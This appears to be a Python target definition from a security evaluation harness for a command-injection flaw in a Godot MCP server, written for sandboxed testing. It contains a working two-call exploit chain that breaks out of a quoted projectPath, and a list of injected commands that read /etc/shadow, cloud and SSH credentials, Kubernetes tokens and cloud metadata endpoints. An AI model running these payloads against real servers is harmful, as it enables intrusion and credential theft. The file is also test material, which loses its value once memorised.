"""CVE-2026-25546: @coding-solo/godot-mcp command injection (CWE-78).

executeOperation builds a shell string `"<godot>" --headless --path "<projectPath>" ...` and runs
it through exec() (a shell). projectPath is wrapped in double quotes but never escaped, so a
projectPath that closes the quote injects an arbitrary command (reach: command_execution). 0.1.1
builds an argument array and calls execFile(godotPath, args), so projectPath reaches Godot as one
literal argument with no shell.

Every executeOperation handler first checks existsSync(join(projectPath, 'project.godot')), so the
injected projectPath must also be a real directory carrying a project.godot entry. That directory
is not seeded: each exploit builds it from tool-call arguments. The first create_scene call writes
a scene under scenePath `<payload>/project.godot/scene.tscn` inside the plain writable project the
image bakes at /opt/base-project, so the real Godot 4.4.1's make_dir_recursive creates
`<payload>/project.godot` as a directory; the second call passes projectPath `<base>/<payload>`,
whose guard now passes, and the quote-break in <payload> fires the command. One exploit per kept
place names the location it reads; the benign call carries no projectPath and is never aimed.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve.detection.targets import Target
from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import PROJECT
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from mcp_auditor.domain.ports import MCPClientPort

# The plain writable Godot project the first call of every exploit operates on, baked by both
# images. It carries no payload: the attacker-named directory is written by the exploit call.
_BASE_PROJECT = "/opt/base-project"

# One command per kept catalogue place the command_execution reach covers. The command reads the
# place its nonce was planted in, and its stdout is captured in the tool response.
_SPECS: tuple[tuple[str, str], ...] = (
    ("process-account-identity", "whoami"),
    ("etc-shadow", "cat /etc/shadow"),
    ("container-hostname", "hostname"),
    ("aws-credentials", "cat /tmp/.aws/credentials"),
    ("gcloud-adc", "cat /tmp/.config/gcloud/application_default_credentials.json"),
    ("azure-profile", "cat /tmp/.azure/azureProfile.json"),
    ("ssh-private-key", "cat /tmp/.ssh/id_rsa"),
    ("shell-history", "cat /tmp/.bash_history"),
    ("git-credentials", "cat /tmp/.git-credentials"),
    ("npmrc", "cat /tmp/.npmrc"),
    ("gh-hosts", "cat /tmp/.config/gh/hosts.yml"),
    ("docker-config", "cat /tmp/.docker/config.json"),
    ("kube-config", "cat /tmp/.kube/config"),
    ("pgpass", "cat /tmp/.pgpass"),
    ("mysql-client-cnf", "cat /tmp/.my.cnf"),
    ("mongorc", "cat /tmp/.mongorc.js"),
    ("mysql-system-cnf", "cat /etc/mysql/my.cnf"),
    ("proc-environ", "printenv MCP_UPSTREAM_SECRET"),
    ("run-secrets", "cat /run/secrets/db_password"),
    ("k8s-sa-token", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("imds", "wget -qO- -T 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("ecs-task-credentials", "wget -qO- -T 5 http://169.254.170.2/v2/credentials/"),
    ("eks-pod-identity", "wget -qO- -T 5 http://169.254.170.23/v1/credentials"),
    ("etc-hosts", "cat /etc/hosts"),
    ("auth-log", "cat /var/log/auth.log"),
)

# Both calls of every exploit carry the quote-break marker `";` (in scenePath for the first, in
# projectPath for the second); the benign call carries no arguments, so it is never aimed.
AIM = re.compile(r'";')


# The payload closes the double quote the shell string wraps projectPath in, runs the command, then
# reopens a quote. Both calls use the same string, so the directory the first call writes is the
# one the second call's guard checks.
def _payload(place_id: str, command: str) -> str:
    return f'{place_id}";{command};"'


def _exploit(place_id: str, command: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    payload = _payload(place_id, command)

    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(
            "create_scene",
            {
                "projectPath": _BASE_PROJECT,
                "scenePath": f"{payload}/project.godot/scene.tscn",
                "rootNodeType": "Node2D",
            },
        )
        await client.call_tool(
            "create_scene",
            {
                "projectPath": f"{_BASE_PROJECT}/{payload}",
                "scenePath": "out.tscn",
                "rootNodeType": "Node2D",
            },
        )

    run.__name__ = f"exploit_{place_id.replace('-', '_')}"
    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get_godot_version", {})


KEPT_PLACES: tuple[str, ...] = tuple(place_id for place_id, _ in _SPECS)

TARGET = Target(
    flaw_id="CVE-2026-25546",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-25546-godot-mcp", "sentinel"),
    server_image="holdout-2026-25546-godot-mcp",
    patched_image="holdout-2026-25546-godot-mcp-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory=PROJECT, has_network=False
    ),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id, command) for place_id, command in _SPECS),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Command injection (CWE-78): an unescaped projectPath in create_scene closes the quoted "
        "path in executeOperation's shell string and runs an arbitrary command in the server's "
        "container through exec()."
    ),
    tools_filter=None,
)
